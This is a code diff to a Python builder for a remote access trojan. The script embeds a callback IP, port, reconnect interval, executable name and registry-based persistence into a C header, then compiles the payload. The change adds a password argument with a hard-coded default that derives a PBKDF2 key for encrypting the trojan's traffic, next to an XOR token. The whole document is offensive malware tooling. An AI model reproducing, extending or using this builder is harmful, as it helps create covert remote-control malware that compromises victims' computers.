@@ -7,6 +7,7 @@ import platform
 import time
 
 import server.scripts.other as other
+
 import argparse
 
 from colorama import Fore,Style,init
@@ -16,7 +17,7 @@ class GeneratePayload:
 
     error = False
 
-    def __init__(self,ip,auto, port, reco, name, registry):
+    def __init__(self,ip,auto, port, reco, name, registry, password):
 
         self.path =  os.getcwd()+"/"+"client/inc/common.h"
         self.list_const_str = ["IP_ADDRESS","NAME_PROG","PATH_ADMIN","PATH_NOT_ADMIN","NAME_KEY_REGISTER","SPLIT"]
@@ -33,16 +34,23 @@ class GeneratePayload:
         self.name = name
         self.registry = registry
 
-        self.token = self.generateToken()
+        
+        self.token = self.generateToken(22) #The key to encrypt and decrypt data using the XOR algorithm
+        self.key = other.generate_PBKDF2_key(password)
+
+        other.printColor("successfully","KEY PBKDF2: \n{}".format(self.key))
         
         try:
+
             self.os  = platform.system()
+        
         except Exception as e:
+
             other.printColor("error",e)
             GeneratePayload.error = True
             exit(0)
-
-        self.main()
+        else:
+            self.main()
     
     def writeFile(self, data):
         try:
@@ -61,8 +69,8 @@ class GeneratePayload:
             other.printColor("successfully", "[+] writing in common.h is done successfully. ")
 
 
-    def generateToken(self):
-        token = binascii.hexlify(os.urandom(22)).decode()
+    def generateToken(self,size):
+        token = binascii.hexlify(os.urandom(size)).decode()
         other.printColor("successfully", "[+] the tokken was generated")
         other.printColor("successfully","[+] token: {}\n".format(token))
         return token
@@ -107,11 +115,13 @@ class GeneratePayload:
         other.printColor("information","[+] the current OS of the system: {}\n".format(self.os))
 
         #print(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
-        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token, self.registry))
+        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token, self.registry, self.key))
+        
         self.compilate() #compilate
-        time.sleep(2) #tempo 
+        time.sleep(1) #tempo 
+
         self.writeFile(str(other.commonHeader())) #rewrite default header
-        pass
+        
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-a","--auto", action="store_true", default=False, help="if the parameter is added, the rat will automatically perform the persistence.")
@@ -121,6 +131,8 @@ parser.add_argument("-r","--reconnect", dest="RECONNECT",default=20,  help="the 
 parser.add_argument("-n","--name", dest="NAME", default="payload.exe", help="the name of the executable (of the rat)")
 parser.add_argument("-m","--move", dest="MOVE", default=False, help="Under development...")
 parser.add_argument("-vr","--registry", dest="REGISTRY_VALUE", default="win64", help="the name of the value of the subkey of the windows registry.")
+parser.add_argument("-pa", "--password", dest="PASSWORD", default="CISCOTHEBOSS", help="The password to generate the key to encrypt and decrypt the data. The default password is 'CISCOTHEBOSS'.")
+
 init()
 
 try:
@@ -134,13 +146,14 @@ try:
     RECO = int(argv["RECONNECT"])
     NAME = str(argv["NAME"])
     REGISTRY = str(argv["REGISTRY_VALUE"])
-
+    PASSWORD = str(argv["PASSWORD"])
+    
     if not(argv["MOVE"]):
         PATH = False
     else:
         PATH = argv["MOVE"]
 
-    GeneratePayload(IP, AUTO, PORT, RECO, NAME, REGISTRY)
+    GeneratePayload(IP, AUTO, PORT, RECO, NAME, REGISTRY, PASSWORD)
 
 except SystemExit:
     
